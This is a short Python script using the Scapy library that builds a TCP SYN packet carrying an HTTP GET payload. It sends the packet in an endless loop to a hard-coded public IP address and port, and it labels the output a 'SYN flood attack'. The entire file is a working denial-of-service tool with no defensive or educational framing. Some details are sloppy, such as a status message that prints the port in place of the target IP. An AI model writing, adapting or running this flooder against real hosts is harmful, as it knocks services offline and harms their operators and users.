from scapy.all import *
import random
import pprint
import os
import struct

target_ip = "104.26.7.92"
destination_port = 52675
source_port = 80
ip = IP(dst=target_ip)

tcp = TCP(sport=source_port, dport=destination_port, flags="S", seq=1000, window=random.randint(1, 1000))

raw = Raw(load="GET / HTTP/1.1\r ")


pkt = ip/tcp/raw

os.system("title %s : " % pkt.summary())
y = "\033[0;34mSYN flood attack sent to"+ "\033[0;34m target_ip: "+str(destination_port)+" \033[0;32m"
print(y, end='\r')
# print the contents of the packet using pprint

pprint.pprint(pkt, indent=16)
# print out the incoming packets
# return how many packets are sent


send(pkt, loop=1, verbose=1)
# count the amount of packets sent

